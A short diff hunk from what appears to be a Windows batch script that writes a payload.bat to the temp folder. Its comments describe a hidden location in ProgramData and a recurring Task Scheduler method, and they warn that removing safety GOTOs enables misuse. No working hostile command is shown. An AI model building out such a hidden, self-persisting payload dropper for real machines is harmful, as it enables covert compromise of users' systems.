@@ -4,8 +4,6 @@ set "payload=%temp%\payload.bat"
 (
 @echo off
 :: BY REMOVING THE GOTO(s) YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
-:: SOME GOTO(s) ARE NECESSARY, SO WATCH WHAT YOU REMOVE.
-
 :: Path of the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that. This is part of the recurring method.
 set "vpath=C:\ProgramData"
 
